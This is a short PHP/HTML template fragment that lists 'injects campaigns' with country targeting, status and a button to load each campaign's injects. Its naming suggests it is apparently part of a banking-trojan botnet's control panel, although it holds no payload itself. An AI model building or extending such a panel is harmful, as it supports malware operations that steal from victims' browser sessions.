<div style="overflow: auto">
    <table class="table table-condensed table-bordered">
        <thead>
        <tr>
            <th>#</th>
            <th>Campaign</th>
            <th>Description</th>
            <th>Countries</th>
            <th>Status</th>
            <th>Injects</th>
        </tr>
        </thead>
        <tbody>
        <?php
            foreach($injectsCampaignsData as $campaign)
            {
                $campaign['status'] = $campaign['status'] === 0 ? 'Completed' : 'Active';
                $campaign['countries'] = (int)$campaign['countries'] === 0 ? 'All' : $campaign['countries'];
                echo '
                    <tr>
                        <td>'.htmlspecialchars($campaign['id']).'</td>
                        <td>'.htmlspecialchars($campaign['name']).'</td>
                        <td>'.htmlspecialchars($campaign['description']).'</td>
                        <td>'.htmlspecialchars($campaign['countries']).'</td>
                        <td>'.htmlspecialchars($campaign['status']).'</td>
                        <td><button class="btn btn-default btn-xs bot-injects-btn-color" data-toggle="modal" data-target="#bot-tab-injects-show-injects" onclick="loadInjectsList('.$campaign['id'].')">Show</button></td>
                    </tr>
                ';
            }
        ?>
        </tbody>
    </table>
</div>